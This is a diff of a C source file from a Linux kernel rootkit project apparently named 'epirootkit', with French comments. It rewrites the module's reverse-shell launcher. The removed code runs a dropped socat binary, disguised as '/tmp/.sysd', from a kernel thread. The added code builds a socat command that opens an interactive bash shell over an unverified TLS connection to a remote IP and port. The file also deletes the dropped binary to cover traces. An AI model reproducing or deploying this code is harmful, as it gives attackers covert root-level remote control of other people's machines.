@@ -11,14 +11,9 @@
 #include "epirootkit.h"
 #include "socat.h"
 
-struct task_struct *socat_task = NULL;  // Pour suivre le processus `socat`
-struct completion socat_completion;  // Pour savoir quand `socat` a terminé
-
 int is_socat_binaire_dropped(void);
 int drop_socat_binaire(void);
-static int socat_task_fn(void *data);
 int launch_reverse_shell(void);
-int stop_reverse_shell(void);
 
 int is_socat_binaire_dropped(void){
 	struct file *f;
@@ -65,84 +60,27 @@ int drop_socat_binaire(void){
 int remove_socat_binaire(void){
 	exec_str_as_command("rm -f " SOCAT_BINARY_PATH, false);
 	if (is_socat_binaire_dropped()) {
-		DBG_MSG("remove_socat_binaire: failed to remove socat binary\n");
+		ERR_MSG("remove_socat_binaire: failed to remove socat binary\n");
 		return -FAILURE;
 	}
 	DBG_MSG("remove_socat_binaire: socat binary removed successfully\n");
 	return SUCCESS;
 }
 
-// Fonction pour gérer la fin du processus
-static int socat_task_fn(void *data) {
-    int ret;
-
-    char ip_port[32];
-	snprintf(ip_port, sizeof(ip_port), "tcp:%s:%d", ip, REVERSE_SHELL_PORT);
-
-	char *argv[] = {
-		"/tmp/.sysd",
-		"exec:'bash -i',pty,stderr,setsid,sigint,sane",
-		ip_port,
-		NULL
-	};
-
-    char *envp[] = {
-        "HOME=/",
-        "PATH=/usr/bin:/bin:/usr/sbin:/sbin:/tmp",
-		"TERM=xterm",
-        NULL
-    };
-
-    // Lancer `socat` via call_usermodehelper
-    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if (ret < 0) {
-        ERR_MSG("socat_task_fn: socat reverse shell failed: %d\n", ret);
-        return ret;
-    }
-
-    DBG_MSG("socat_task_fn: socat reverse shell launched\n");
-
-    // Attendre que `socat` termine
-    wait_for_completion(&socat_completion);
-
-    DBG_MSG("socat_task_fn: socat reverse shell exited\n");
-
-    return 0;
-}
-
 int launch_reverse_shell(void){
-	// use socat file:"$(tty)",raw,echo=0 tcp-listen:9001 to launch server
-	
 	if (!is_socat_binaire_dropped()) {
-		DBG_MSG("launch_reverse_shell: socat binary not dropped\n");
+		ERR_MSG("launch_reverse_shell: socat binary not dropped\n");
 		return -FAILURE;
 	}
 
-    // Initialisation de la structure de synchronisation
-    init_completion(&socat_completion);
+	// launch socat in a userland managed thread
+	char cmd[256];
+	snprintf(cmd, 256, "%s exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &", SOCAT_BINARY_PATH, ip, REVERSE_SHELL_PORT);
+	int ret = exec_str_as_command(cmd, false);
+	if (ret == SUCCESS)
+		DBG_MSG("launch_reverse_shell: socat reverse shell launched\n");
+	else
+		ERR_MSG("launch_reverse_shell: failed to start socat reverse shell\n");
 
-    // Créer un nouveau thread pour exécuter socat
-    socat_task = kthread_run(socat_task_fn, NULL, "socat_task");
-    if (IS_ERR(socat_task)) {
-        ERR_MSG("launch_reverse_shell: failed to create socat task: %ld\n", PTR_ERR(socat_task));
-		return -FAILURE;
-    } else {
-        DBG_MSG("launch_reverse_shell: socat task started\n");
-    }
-
-	return SUCCESS;
-}
-
-// Fonction pour arrêter socat et nettoyer les ressources
-int stop_reverse_shell(void){
-    if (socat_task) {
-        DBG_MSG("stop_reverse_shell: stopping socat task\n");
-        complete(&socat_completion);  // Terminer `socat`
-        kthread_stop(socat_task);  // Arrêter le thread de socat
-        socat_task = NULL;
-    }else{
-		DBG_MSG("stop_reverse_shell: socat task is not running\n");
-	}
-
-	return SUCCESS;
+	return ret;
 }
